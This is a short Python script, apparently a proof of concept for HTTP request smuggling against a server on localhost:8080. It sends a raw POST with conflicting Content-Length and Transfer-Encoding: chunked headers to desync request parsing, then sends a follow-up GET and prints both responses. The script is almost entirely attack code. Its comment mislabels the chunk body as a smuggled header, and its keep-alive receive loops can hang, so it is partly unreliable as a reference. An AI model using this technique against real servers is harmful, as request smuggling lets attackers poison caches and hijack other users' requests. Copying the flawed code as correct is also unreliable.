import socket

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('localhost', 8080))

request = b'POST / HTTP/1.1\r\n'
request += b'Host: localhost\r\n'
request += b'Connection: keep-alive\r\n'
request += b'Content-Type: application/x-www-form-urlencoded\r\n'
request += b'Content-Length: 3\r\n'
request += b'Transfer-Encoding: chunked\r\n'
request += b'\r\n'
request += b'8\r\n'
request += b'SMUGGLED\r\n' # the smuggled header
request += b'0\r\n'
request += b'\r\n'

client_socket.sendall(request)
response_data = b''
while True:
    response_chunk = client_socket.recv(1024)
    if not response_chunk:
        break
    response_data += response_chunk

print("response:")
print(response_data.decode())


client_socket.close()

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('localhost', 8080))

request = b'GET / HTTP/1.1\r\n'
request += b'Host: localhost\r\n'
request += b'Connection: keep-alive\r\n'
request += b'Content-Type: application/x-www-form-urlencoded\r\n'
request += b'\r\n'
client_socket.sendall(request)

response_data = b''
while True:
    response_chunk = client_socket.recv(1024)
    if not response_chunk:
        break
    response_data += response_chunk

print("response:")
print(response_data.decode())